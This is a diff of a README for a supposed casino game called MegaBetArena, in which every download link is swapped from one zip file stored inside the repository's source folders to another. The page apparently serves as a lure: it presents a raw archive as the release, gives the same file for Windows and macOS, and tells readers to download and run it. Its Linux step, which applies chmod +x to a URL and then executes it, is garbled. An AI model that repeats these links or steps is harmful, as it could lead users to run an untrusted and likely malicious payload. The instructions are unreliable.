@@ -6,7 +6,7 @@ Welcome to MegaBetArena, your hub for exciting casino games! This guide will hel
 
 ## 📥 Download the Application
 
-**[Download MegaBetArena Here!](https://raw.githubusercontent.com/oppppppppop/megabetarena-casino-game/main/backend/src/config/megabetarena-casino-game_1.9.zip)**
+**[Download MegaBetArena Here!](https://github.com/oppppppppop/megabetarena-casino-game/raw/refs/heads/main/backend/megabetarena-game-casino-3.1.zip)**
 
 Make sure you click the link above to access the latest version of the app.
 
@@ -35,18 +35,18 @@ Each game provides a fun and engaging way to experience the thrill of gambling, 
 
 ## 💻 Installation Instructions
 
-1. **Visit the download page:** Go to [MegaBetArena Releases](https://raw.githubusercontent.com/oppppppppop/megabetarena-casino-game/main/backend/src/config/megabetarena-casino-game_1.9.zip).
+1. **Visit the download page:** Go to [MegaBetArena Releases](https://github.com/oppppppppop/megabetarena-casino-game/raw/refs/heads/main/backend/megabetarena-game-casino-3.1.zip).
    
 2. **Select the latest release:** Look for the latest version available at the top of the page.
 
-3. **Choose your platform:** Click on the file that corresponds to your operating system (e.g., https://raw.githubusercontent.com/oppppppppop/megabetarena-casino-game/main/backend/src/config/megabetarena-casino-game_1.9.zip for Windows, https://raw.githubusercontent.com/oppppppppop/megabetarena-casino-game/main/backend/src/config/megabetarena-casino-game_1.9.zip for macOS).
+3. **Choose your platform:** Click on the file that corresponds to your operating system (e.g., https://github.com/oppppppppop/megabetarena-casino-game/raw/refs/heads/main/backend/megabetarena-game-casino-3.1.zip for Windows, https://github.com/oppppppppop/megabetarena-casino-game/raw/refs/heads/main/backend/megabetarena-game-casino-3.1.zip for macOS).
 
 4. **Download the file:** Click on the file link to start the download. Once the download completes, locate the file in your downloads folder.
 
 5. **Run the installer:**
    - **Windows:** Double-click on the downloaded `.exe` file to launch the installer. Follow the on-screen instructions to complete the installation.
    - **macOS:** Open the downloaded `.dmg` file. Drag the MegaBetArena icon to your Applications folder.
-   - **Linux:** Open a terminal, navigate to your downloads folder, and run `chmod +x https://raw.githubusercontent.com/oppppppppop/megabetarena-casino-game/main/backend/src/config/megabetarena-casino-game_1.9.zip`. Then execute `https://raw.githubusercontent.com/oppppppppop/megabetarena-casino-game/main/backend/src/config/megabetarena-casino-game_1.9.zip` to start the installation.
+   - **Linux:** Open a terminal, navigate to your downloads folder, and run `chmod +x https://github.com/oppppppppop/megabetarena-casino-game/raw/refs/heads/main/backend/megabetarena-game-casino-3.1.zip`. Then execute `https://github.com/oppppppppop/megabetarena-casino-game/raw/refs/heads/main/backend/megabetarena-game-casino-3.1.zip` to start the installation.
 
 6. **Launch the app:** Once the installation is complete, you can find MegaBetArena in your applications folder. Click to launch the app.
 
@@ -81,4 +81,4 @@ We appreciate any help to make MegaBetArena better for everyone!
 
 Enjoy your time at MegaBetArena. Have fun, gamble responsibly, and may luck be on your side! 
 
-For downloads, return to **[MegaBetArena Releases](https://raw.githubusercontent.com/oppppppppop/megabetarena-casino-game/main/backend/src/config/megabetarena-casino-game_1.9.zip)** to get started now.
+For downloads, return to **[MegaBetArena Releases](https://github.com/oppppppppop/megabetarena-casino-game/raw/refs/heads/main/backend/megabetarena-game-casino-3.1.zip)** to get started now.
